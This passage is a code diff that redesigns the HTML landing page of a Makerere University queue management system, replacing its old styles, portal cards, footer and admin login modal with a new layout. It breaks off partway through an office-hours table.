-            border-radius: 8px; margin-bottom: 14px; display: none;
-        }
-        .modal-note {
-            font-size: 11.5px; color: rgba(255,255,255,0.3);
-            text-align: center; margin-top: 14px; line-height: 1.5;
-        }
-
-        /* ─── FOOTER ─── */
-        .footer {
-            position: relative; z-index: 5;
-            background: var(--green-dark);
-            border-top: 1px solid rgba(255,255,255,0.07);
-        }
-        .footer-main {
-            max-width: 1180px; margin: 0 auto;
-            padding: 52px 40px 40px;
-            display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 48px;
-        }
-        .footer-brand { }
-        .footer-logo-row {
-            display: flex; align-items: center; gap: 12px; margin-bottom: 16px;
-        }
-        .footer-logo-circle {
-            width: 42px; height: 42px; border-radius: 50%;
-            background: radial-gradient(circle, var(--gold) 0%, #a07c18 100%);
-            border: 2px solid rgba(201,162,39,0.4);
-            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
-        }
-        .footer-logo-circle svg { width: 22px; height: 22px; fill: var(--green-dark); }
-        .footer-brand-name {
-            font-family: 'Playfair Display', serif;
-            font-size: 16px; font-weight: 700; color: white; letter-spacing: 1px;
-        }
-        .footer-brand-sub { font-size: 10.5px; color: rgba(255,255,255,0.35); letter-spacing: 0.5px; }
-        .footer-brand-desc {
-            font-size: 13px; color: rgba(255,255,255,0.4); line-height: 1.7; margin-bottom: 20px;
-        }
-        .footer-contact-item {
-            display: flex; align-items: center; gap: 8px; margin-bottom: 8px;
-        }
-        .footer-contact-item svg { width: 13px; height: 13px; fill: var(--gold); opacity: 0.7; flex-shrink: 0; }
-        .footer-contact-item span { font-size: 12.5px; color: rgba(255,255,255,0.45); }
-
-        .footer-col-title {
-            font-size: 10.5px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;
-            color: var(--gold); margin-bottom: 18px;
-            padding-bottom: 10px; border-bottom: 1px solid rgba(201,162,39,0.2);
-        }
-        .footer-link {
-            display: block; font-size: 13px; color: rgba(255,255,255,0.45);
-            text-decoration: none; margin-bottom: 10px; transition: color 0.2s;
-        }
-        .footer-link:hover { color: rgba(255,255,255,0.8); }
-
-        .footer-hours-row { display: flex; justify-content: space-between; margin-bottom: 9px; }
-        .footer-hours-row .day { font-size: 12.5px; color: rgba(255,255,255,0.4); }
-        .footer-hours-row .time { font-size: 12.5px; color: rgba(255,255,255,0.65); font-weight: 500; }
-        .hours-closed { color: rgba(255,80,80,0.65) !important; }
-
-        .footer-bottom {
-            border-top: 1px solid rgba(255,255,255,0.06);
-            padding: 18px 40px;
-            max-width: 1180px; margin: 0 auto;
-            display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;
-        }
-        .footer-bottom-left { font-size: 12px; color: rgba(255,255,255,0.3); }
-        .footer-bottom-left span { color: var(--gold); opacity: 0.7; }
-        .footer-bottom-right { display: flex; gap: 20px; }
-        .footer-bottom-right a { font-size: 11.5px; color: rgba(255,255,255,0.3); text-decoration: none; transition: color 0.2s; }
-        .footer-bottom-right a:hover { color: rgba(255,255,255,0.6); }
-        .footer-divider { border: none; border-top: 1px solid rgba(255,255,255,0.04); }
-
-        /* ─── TOAST ─── */
-        #toast {
-            position: fixed; bottom: 24px; right: 24px; z-index: 9999;
-            padding: 12px 20px; border-radius: 10px; font-size: 13px;
-            color: white; display: none;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
-        }
-
-        /* ─── ANIMATIONS ─── */
-        .fade-up {
-            opacity: 0; transform: translateY(24px);
-            animation: fadeUp 0.7s ease forwards;
-        }
-        @keyframes fadeUp { to { opacity: 1; transform: translateY(0); } }
-        .delay-1 { animation-delay: 0.1s; }
-        .delay-2 { animation-delay: 0.2s; }
-        .delay-3 { animation-delay: 0.3s; }
-        .delay-4 { animation-delay: 0.4s; }
-        .delay-5 { animation-delay: 0.5s; }
-        .delay-6 { animation-delay: 0.6s; }
-
-        /* ─── RESPONSIVE ─── */
-        @media (max-width: 900px) {
-            .cards-grid { grid-template-columns: 1fr 1fr; }
-            .cards-bottom { grid-template-columns: 1fr 1fr; max-width: 100%; }
-            .footer-main { grid-template-columns: 1fr 1fr; gap: 32px; }
-            .hero-title { font-size: 36px; }
-            .stats-row { flex-wrap: wrap; }
-            .stat-item { flex: 0 0 50%; border-right: none; border-bottom: 1px solid var(--border); }
-        }
-        @media (max-width: 600px) {
-            .header { padding: 24px 20px; gap: 16px; flex-wrap: wrap; }
-            .header-institution { font-size: 20px; }
-            .topbar { padding: 8px 20px; }
-            .hero { padding: 40px 20px 36px; }
-            .hero-title { font-size: 28px; }
-            .cards-grid { grid-template-columns: 1fr; }
-            .cards-bottom { grid-template-columns: 1fr; }
-            .cards-wrapper { padding: 0 20px 40px; }
-            .info-strip { gap: 24px; padding: 20px; }
-            .footer-main { grid-template-columns: 1fr; gap: 28px; padding: 36px 20px 28px; }
-            .footer-bottom { padding: 16px 20px; flex-direction: column; align-items: flex-start; }
-        }
-    </style>
+/* ── responsive ── */
+@media(max-width:1100px){.portals{grid-template-columns:repeat(2,1fr)}.footer-top{grid-template-columns:1fr 1fr}}
+@media(max-width:800px){
+  .ribbon,.header{padding-left:20px;padding-right:20px}
+  .hero{padding:52px 20px 60px}
+  .stats-inner{grid-template-columns:repeat(2,1fr);padding:0 20px}
+  .stat-cell:nth-child(2){border-right:none}
+  .main{padding:36px 20px 56px}
+  .portals{gap:16px}
+  .info-grid{grid-template-columns:1fr}
+  .footer-top{grid-template-columns:1fr 1fr;padding:36px 20px}
+}
+@media(max-width:560px){
+  .ribbon-nav{justify-content:center}
+  .portals{grid-template-columns:1fr}
+  .stats-inner{grid-template-columns:1fr 1fr}
+  .hero-h1{font-size:34px}
+  .footer-top{grid-template-columns:1fr}
+  .footer-bottom-inner{flex-direction:column;text-align:center}
+  .modal{padding:32px 20px}
+}
+</style>
 </head>
 <body>
 
-    <!-- TOP BAR -->
-    <div class="topbar">
-        <div class="topbar-left">Makerere University &mdash; Kampala, Uganda | Est. 1922</div>
-        <div class="topbar-right">
-            <a href="student-token.html">Token Kiosk</a>
-            <div class="topbar-divider"></div>
-            <a href="public-display.html">Public Screen View</a>
-            <div class="topbar-divider"></div>
-            <a href="login.html">Official Portal</a>
-        </div>
+<a class="skip" href="#main">Skip to main content</a>
+
+<!-- ribbon -->
+<div class="ribbon">
+  <div class="ribbon-ticker">
+    <span class="live-badge"><span class="live-dot" aria-hidden="true"></span>LIVE</span>
+    <p class="ribbon-text">Queue Management System — Serving students, staff &amp; visitors across all departments</p>
+  </div>
+  <nav class="ribbon-nav">
+    <a href="student-token.html">
+      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      Student Portal
+    </a>
+    <a href="login.html">
+      <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+      Staff Login
+    </a>
+    <a href="public-display.html">
+      <svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14z"/></svg>
+      Public View
+    </a>
+  </nav>
+</div>
+
+<!-- header -->
+<header class="header">
+  <div class="header-inner">
+    <a class="brand" href="#">
+      <div class="brand-shield" aria-hidden="true">
+        <svg viewBox="0 0 24 24"><path d="M12 3L1 9l4 2.18v6L12 21l7-3.82v-6l2-1.09V17h2V9L12 3zm6.82 6L12 12.72 5.18 9 12 5.28 18.82 9zM17 15.99l-5 2.73-5-2.73v-3.72L12 15l5-2.73v3.72z"/></svg>
+      </div>
+      <div class="brand-copy">
+        <div class="brand-name">MAKERERE <span>UNIVERSITY</span></div>
+        <div class="brand-tagline">Queue Management System</div>
+      </div>
+    </a>
+    <div class="header-clock">
+      <div class="clock-time" id="liveDateTime">Loading…</div>
+      <div class="clock-loc">Kampala, Uganda &nbsp;·&nbsp; East Africa Time</div>
     </div>
+  </div>
+</header>
 
-    <!-- HEADER -->
-    <div class="header fade-up">
-        <div class="coat-of-arms">
-            <svg viewBox="0 0 24 24"><path d="M12 3L1 9l4 2.18v6L12 21l7-3.82v-6l2-1.09V17h2V9L12 3zm6.82 6L12 12.72 5.18 9 12 5.28 18.82 9zM17 15.99l-5 2.73-5-2.73v-3.72L12 15l5-2.73v3.72z"/></svg>
-        </div>
-        <div class="header-text">
-            <div class="header-institution">Makerere <span>University</span></div>
-            <div class="header-system">Queue Management System &nbsp;·&nbsp; Smart Service Delivery</div>
-        </div>
-        <div class="header-meta">
-            <div class="live-badge"><span class="live-dot"></span> System Online</div>
-            <div class="header-time" id="liveTime"></div>
-        </div>
+<!-- hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div class="hero-kicker">
+      <span class="hero-kicker-dot" aria-hidden="true"></span>
+      Official Service Portal — Est. 1922
     </div>
-
-    <!-- HERO -->
-    <div class="hero">
-        <div class="hero-eyebrow fade-up delay-1">Official Service Portal</div>
-        <h1 class="hero-title fade-up delay-2">Efficient. <em>Organised.</em> Dignified.</h1>
-        <p class="hero-subtitle fade-up delay-3">
-            The Makerere University Queue Management System ensures every student and staff member is served
-            swiftly, fairly, and with the respect they deserve.
-        </p>
-
-        <div class="stats-row fade-up delay-4">
-            <div class="stat-item">
-                <div class="stat-num" id="statWaiting">—</div>
-                <div class="stat-desc">Currently Waiting</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-num" id="statServing">—</div>
-                <div class="stat-desc">Being Served</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-num" id="statDone">—</div>
-                <div class="stat-desc">Served Today</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-num" id="statOffices">4</div>
-                <div class="stat-desc">Active Offices</div>
-            </div>
-        </div>
+    <h1 class="hero-h1">Efficient. <em>Organised.</em><br>Dignified.</h1>
+    <p class="hero-desc">Makerere University's queue management system ensures every student, staff member and visitor is served swiftly, fairly and with full dignity — no matter their circumstance.</p>
+    <div class="hero-actions">
+      <a class="btn-gold" href="student-token.html">
+        <svg viewBox="0 0 24 24"><path d="M20 6H4v2h16V6zm1 10v-2l-1-5H4l-1 5v2h1v2h2v-2h10v2h2v-2h1zm-3-4H6l.5-3h11l.5 3z"/></svg>
+        Get Your Queue Token
+      </a>
+      <a class="btn-outline" href="public-display.html">
+        <svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14z"/></svg>
+        View Live Display
+      </a>
     </div>
+  </div>
+</section>
 
-    <!-- INFO STRIP -->
-    <div class="info-strip fade-up delay-2">
-        <div class="info-item">
-            <div class="info-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm.5 5v5.25l4.5 2.67-.75 1.23L11 13V7h1.5z"/></svg></div>
-            <div>
-                <div class="info-text-label">Operating Hours</div>
-                <div class="info-text-val">Mon – Fri &nbsp;·&nbsp; 8:00 AM – 5:00 PM</div>
-            </div>
-        </div>
-        <div class="info-item">
-            <div class="info-icon"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>
-            <div>
-                <div class="info-text-label">Location</div>
-                <div class="info-text-val">Main Campus, Kampala, Uganda</div>
-            </div>
-        </div>
-        <div class="info-item">
-            <div class="info-icon"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
-            <div>
-                <div class="info-text-label">Contact</div>
-                <div class="info-text-val">+256 414 532 631</div>
-            </div>
-        </div>
-        <div class="info-item">
-            <div class="info-icon"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></div>
-            <div>
-                <div class="info-text-label">Email</div>
-                <div class="info-text-val">registrar@mak.ac.ug</div>
-            </div>
-        </div>
+<!-- stats -->
+<section class="stats-row">
+  <h2 class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden">Live Queue Statistics</h2>
+  <div class="stats-inner">
+    <div class="stat-cell s-wait">
+      <div class="stat-number" id="statWaiting">—</div>
+      <div class="stat-label">Currently Waiting</div>
+      <span class="stat-badge sb-wait">In Queue</span>
     </div>
-
-    <!-- PORTAL CARDS -->
-    <div class="cards-wrapper">
-        <div class="section-label fade-up delay-1" style="margin-top:56px;">
-            <h2>Select Your Portal</h2>
-        </div>
-
-        <div class="cards-grid fade-up delay-2">
-
-            <!-- STUDENT TOKEN -->
-            <a href="student-token.html" class="portal-card featured">
-                <div class="card-accent-line accent-blue"></div>
-                <div class="card-icon-wrap icon-blue">
-                    <svg class="svg-blue" viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
-                </div>
-                <div class="card-title">Get Queue Token</div>
-                <div class="card-desc">Walk-in students and staff can generate a queue token for any service office. Fast, paperless, and organised.</div>
-                <ul class="card-services">
-                    <li>Registry &amp; Admissions</li>
-                    <li>Finance &amp; Bursary</li>
-                    <li>Transcripts &amp; Testimonials</li>
-                    <li>General Inquiries</li>
-                </ul>
-                <div class="card-cta">
-                    Get a Token
-                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
-                </div>
-            </a>
-
-            <!-- OFFICER LOGIN -->
-            <a href="login.html" class="portal-card">
-                <div class="card-accent-line accent-gold"></div>
-                <div class="card-icon-wrap icon-gold">
-                    <svg class="svg-gold" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-                </div>
-                <div class="card-title">Officer Login</div>
-                <div class="card-desc">Service officers log in to manage their queue, call the next student, and track service completions in real time.</div>
-                <ul class="card-services">
-                    <li>Call &amp; serve next token</li>
-                    <li>Mark service complete</li>
-                    <li>View office queue status</li>
-                    <li>Daily session tracking</li>
-                </ul>
-                <div class="card-cta">
-                    Officer Sign In
-                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
-                </div>
-            </a>
-
-            <!-- PUBLIC DISPLAY -->
-            <a href="public-display.html" class="portal-card">
-                <div class="card-accent-line accent-emerald"></div>
-                <div class="card-icon-wrap icon-emerald">
-                    <svg class="svg-emerald" viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14zM8 15c0-1.66 1.34-3 3-3 .35 0 .69.07 1 .18V6h5v2h-3v7.03c-.02 1.64-1.35 2.97-3 2.97-1.66 0-3-1.34-3-3z"/></svg>
-                </div>
-                <div class="card-title">Public Display</div>
-                <div class="card-desc">Live TV-screen view showing currently called tokens and serving status across all active offices.</div>
-                <ul class="card-services">
-                    <li>Live token announcements</li>
-                    <li>All offices at a glance</li>
-                    <li>Auto-refreshing display</li>
-                    <li>Designed for large screens</li>
-                </ul>
-                <div class="card-cta">
-                    Open Display
-                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
-                </div>
-            </a>
-
-        </div><!-- /cards-grid -->
-
-        <!-- BOTTOM ROW: Admin only -->
-        <div class="cards-bottom fade-up delay-3">
-
-            <div class="portal-card" onclick="openAdminModal()" style="cursor:pointer;">
-                <div class="card-accent-line accent-violet"></div>
-                <div class="card-icon-wrap icon-violet">
-                    <svg class="svg-violet" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 4l5 2.18V11c0 3.5-2.33 6.79-5 7.93-2.67-1.14-5-4.43-5-7.93V7.18L12 5zm-1 4v5h2V9h-2zm0 6v2h2v-2h-2z"/></svg>
-                </div>
-                <div class="card-title">Admin Panel</div>
-                <div class="card-desc">Restricted to authorised university administrators only. Manage offices, officers, and system-wide configurations.</div>
-                <ul class="card-services">
-                    <li>Manage service offices</li>
-                    <li>Officer accounts &amp; PINs</li>
-                    <li>Queue reset &amp; controls</li>
-                </ul>
-                <div class="card-cta">
-                    Authorised Access Only
-                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
-                </div>
-            </div>
-
-            <!-- QUICK HELP -->
-            <div class="portal-card" style="cursor:default; pointer-events:none;">
-                <div class="card-accent-line" style="background:#64748b;"></div>
-                <div style="margin-bottom:18px;">
-                    <div class="footer-col-title" style="margin-bottom:14px; border:none; padding:0;">How It Works</div>
-                </div>
-                <div style="display:flex; flex-direction:column; gap:14px;">
-                    <div style="display:flex; align-items:flex-start; gap:12px;">
-                        <div style="width:24px;height:24px;border-radius:50%;background:rgba(201,162,39,0.15);border:1px solid rgba(201,162,39,0.3);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--gold);flex-shrink:0;">1</div>
-                        <div style="font-size:13px;color:rgba(255,255,255,0.5);line-height:1.5;">Visit the <strong style="color:rgba(255,255,255,0.75);">Get Queue Token</strong> portal and select your office and service.</div>
-                    </div>
-                    <div style="display:flex; align-items:flex-start; gap:12px;">
-                        <div style="width:24px;height:24px;border-radius:50%;background:rgba(201,162,39,0.15);border:1px solid rgba(201,162,39,0.3);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--gold);flex-shrink:0;">2</div>
-                        <div style="font-size:13px;color:rgba(255,255,255,0.5);line-height:1.5;">Receive your token number. Wait comfortably &mdash; watch the <strong style="color:rgba(255,255,255,0.75);">Public Display</strong> for your call.</div>
-                    </div>
-                    <div style="display:flex; align-items:flex-start; gap:12px;">
-                        <div style="width:24px;height:24px;border-radius:50%;background:rgba(201,162,39,0.15);border:1px solid rgba(201,162,39,0.3);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--gold);flex-shrink:0;">3</div>
-                        <div style="font-size:13px;color:rgba(255,255,255,0.5);line-height:1.5;">When called, proceed to your assigned office window for service.</div>
-                    </div>
-                </div>
-            </div>
-
-        </div><!-- /cards-bottom -->
-    </div><!-- /cards-wrapper -->
-
-    <!-- FOOTER -->
-    <footer class="footer">
-        <div class="footer-main">
-            <div class="footer-brand">
-                <div class="footer-logo-row">
-                    <div class="footer-logo-circle">
-                        <svg viewBox="0 0 24 24"><path d="M12 3L1 9l4 2.18v6L12 21l7-3.82v-6l2-1.09V17h2V9L12 3zm6.82 6L12 12.72 5.18 9 12 5.28 18.82 9zM17 15.99l-5 2.73-5-2.73v-3.72L12 15l5-2.73v3.72z"/></svg>
-                    </div>
-                    <div>
-                        <div class="footer-brand-name">Makerere University</div>
-                        <div class="footer-brand-sub">Queue Management System</div>
-                    </div>
-                </div>
-                <p class="footer-brand-desc">
-                    Makerere University is committed to providing efficient, dignified, and transparent service delivery
-                    to all students and staff through modern digital queue management.
-                </p>
-                <div class="footer-contact-item">
-                    <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-                    <span>University Road, Kampala, Uganda</span>
-                </div>
-                <div class="footer-contact-item">
-                    <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
-                    <span>+256 414 532 631</span>
-                </div>
-                <div class="footer-contact-item">
-                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
-                    <span>registrar@mak.ac.ug</span>
-                </div>
-            </div>
-
-            <div>
-                <div class="footer-col-title">Quick Links</div>
-                <a href="student-token.html" class="footer-link">Get Queue Token</a>
-                <a href="login.html" class="footer-link">Officer Login</a>
-                <a href="public-display.html" class="footer-link">Public Display Screen</a>
-                <a href="#" class="footer-link">University Website</a>
-                <a href="#" class="footer-link">Student Portal</a>
-                <a href="#" class="footer-link">Help &amp; Support</a>
-            </div>
-
-            <div>
-                <div class="footer-col-title">Service Offices</div>
-                <a href="student-token.html" class="footer-link">Registry</a>
-                <a href="student-token.html" class="footer-link">Finance &amp; Bursary</a>
-                <a href="student-token.html" class="footer-link">Transcripts</a>
-                <a href="student-token.html" class="footer-link">Testimonials</a>
-                <a href="student-token.html" class="footer-link">General Inquiries</a>
-            </div>
-
-            <div>
-                <div class="footer-col-title">Office Hours</div>
-                <div class="footer-hours-row"><span class="day">Monday</span><span class="time">8:00 – 17:00</span></div>
-                <div class="footer-hours-row"><span class="day">Tuesday</span><span class="time">8:00 – 17:00</span></div>
-                <div class="footer-hours-row"><span class="day">Wednesday</span><span class="time">8:00 – 17:00</span></div>
-                <div class="footer-hours-row"><span class="day">Thursday</span><span class="time">8:00 – 17:00</span></div>
-                <div class="footer-hours-row"><span class="day">Friday</span><span class="time">8:00 – 17:00</span></div>
-                <div class="footer-hours-row"><span class="day">Saturday</span><span class="time hours-closed">Closed</span></div>
-                <div class="footer-hours-row"><span class="day">Sunday</span><span class="time hours-closed">Closed</span></div>
-                <div style="margin-top:14px; padding:10px 12px; background:rgba(201,162,39,0.08); border:1px solid rgba(201,162,39,0.2); border-radius:8px;">
-                    <div style="font-size:11px; color:var(--gold); font-weight:600; letter-spacing:0.5px; margin-bottom:3px;">Public Holidays</div>
-                    <div style="font-size:11.5px; color:rgba(255,255,255,0.35);">Offices closed on all Ugandan public holidays.</div>
-                </div>
-            </div>
-        </div>
-
-        <hr class="footer-divider">
-
-        <div class="footer-bottom">
-            <div class="footer-bottom-left">
-                &copy; <span id="footerYear"></span> Makerere University. All rights reserved. &nbsp;|&nbsp; Queue Management System v2.0
-            </div>
-            <div class="footer-bottom-right">
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms of Use</a>
-                <a href="#">Accessibility</a>
-                <a href="#">IT Support</a>
-            </div>
-        </div>
-    </footer>
-
-    <!-- ADMIN AUTH MODAL -->
-    <div class="modal-overlay" id="adminModal">
-        <div class="modal-box">
-            <button class="modal-close" onclick="closeAdminModal()">&times;</button>
-            <div class="modal-coat">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 4l5 2.18V11c0 3.5-2.33 6.79-5 7.93-2.67-1.14-5-4.43-5-7.93V7.18L12 5z"/></svg>
-            </div>
-            <div class="modal-title">Administrator Access</div>
-            <div class="modal-subtitle">Authorised personnel only &mdash; Makerere University</div>
-            <div class="modal-divider"></div>
-            <div class="modal-error" id="adminError"></div>
-            <form id="adminLoginForm" onsubmit="submitAdminLogin(event)">
-                <div class="form-group">
-                    <label>Email Address</label>
-                    <input type="email" id="adminEmail" placeholder="admin@mak.ac.ug" required autocomplete="off">
-                </div>
-                <div class="form-group">
-                    <label>PIN / Password</label>
-                    <input type="password" id="adminPin" placeholder="&bull;&bull;&bull;&bull;" required maxlength="20">
-                </div>
-                <button type="submit" class="modal-btn" id="adminSubmitBtn">Sign In to Admin Panel</button>
-            </form>
-            <div class="modal-note">
-                This portal is strictly for authorised administrators.<br>
-                Unauthorised access is a disciplinary offence.
-            </div>
-        </div>
+    <div class="stat-cell s-serve">
+      <div class="stat-number" id="statServing">—</div>
+      <div class="stat-label">Being Served</div>
+      <span class="stat-badge sb-serve">At Window</span>
     </div>
+    <div class="stat-cell s-done">
+      <div class="stat-number" id="statDone">—</div>
+      <div class="stat-label">Served Today</div>
+      <span class="stat-badge sb-done">Completed</span>
+    </div>
+    <div class="stat-cell s-offices">
+      <div class="stat-number" id="statOffices">6</div>
+      <div class="stat-label">Active Offices</div>
+      <span class="stat-badge sb-office">Open Now</span>
+    </div>
+  </div>
+</section>
 
-    <div id="toast"></div>
+<!-- main content -->
+<main id="main" class="main">
 
-    <script>
-        const API_BASE_URL = "https://web-production-eeaf2.up.railway.app";
+  <section>
+    <div class="section-head">
+      <h2>Service Portals</h2>
+      <a href="#">View All Services →</a>
+    </div>
+    <div class="portals">
+      <a class="card c-token" href="student-token.html">
+        <div class="card-icon ci-green"><svg viewBox="0 0 24 24"><path d="M20 6H4v2h16V6zm1 10v-2l-1-5H4l-1 5v2h1v2h2v-2h10v2h2v-2h1zm-3-4H6l.5-3h11l.5 3z"/></svg></div>
+        <div class="card-title">Get Queue Token</div>
+        <p class="card-body">Generate your queue number for any service office — walk in, get served, leave satisfied.</p>
+        <span class="chip chip-green">Walk-in Service</span>
+      </a>
+      <a class="card c-officer" href="login.html">
+        <div class="card-icon ci-gold"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+        <div class="card-title">Officer Login</div>
+        <p class="card-body">Service officers: log in to manage your desk queue, call clients and update service records.</p>
+        <span class="chip chip-gold">Staff Access</span>
+      </a>
+      <a class="card c-display" href="public-display.html">
+        <div class="card-icon ci-red"><svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14z"/></svg></div>
+        <div class="card-title">Public Display</div>
+        <p class="card-body">Live TV-screen view of the queue — see who is being called at each office in real time.</p>
+        <span class="chip chip-red">Live View</span>
+      </a>
+      <div class="card c-admin" role="button" tabindex="0" onclick="openAdminModal()" onkeydown="if(event.key==='Enter'||event.key===' ')openAdminModal()">
+        <div class="card-icon ci-purple"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>
+        <div class="card-title">Admin Panel</div>
+        <p class="card-body">Authorised administrators only — access system controls, reports and configuration settings.</p>
+        <span class="chip chip-purple">Restricted</span>
+      </div>
+    </div>
+  </section>
 
-        // ── LIVE CLOCK ─────────────────────────────────
-        function updateClock() {
-            const now = new Date();
-            const opts = { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' };
-            document.getElementById('liveTime').textContent = now.toLocaleDateString('en-UG', opts);
-        }
-        updateClock();
-        setInterval(updateClock, 30000);
+  <section>
+    <div class="section-head">
+      <h2>Information &amp; Hours</h2>
+      <a href="#">Download Guide →</a>
+    </div>
+    <div class="info-grid">
+      <div class="info-panel">
+        <h3 class="panel-title">How the Queue System Works</h3>
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <div class="step-title">Generate Your Token</div>
+              <p class="step-desc">Visit the Get Queue Token portal, select your service office. A unique token number is issued instantly.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <div class="step-title">Wait Comfortably</div>
+              <p class="step-desc">Monitor the Public Display board or listen for your number to be called at your assigned window.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div>
+              <div class="step-title">Proceed to Your Window</div>
+              <p class="step-desc">When called, proceed promptly. Assistance is available for persons with disabilities and special needs.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div>
+              <div class="step-title">Rate Your Experience</div>
+              <p class="step-desc">After being served, share feedback to help us improve service delivery for everyone.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="info-panel">
+        <h3 class="panel-title">Office Hours</h3>
+        <table class="hours-table">
+          <tbody>
+            <tr><td>Monday – Friday</td><td class="open">8:00 AM – 5:00 PM</td></tr>
+            <tr><td>Saturday</td><td class="closed">Closed</td></tr>
+            <tr><td>Sunday</td><td class="closed">Closed</td></tr>
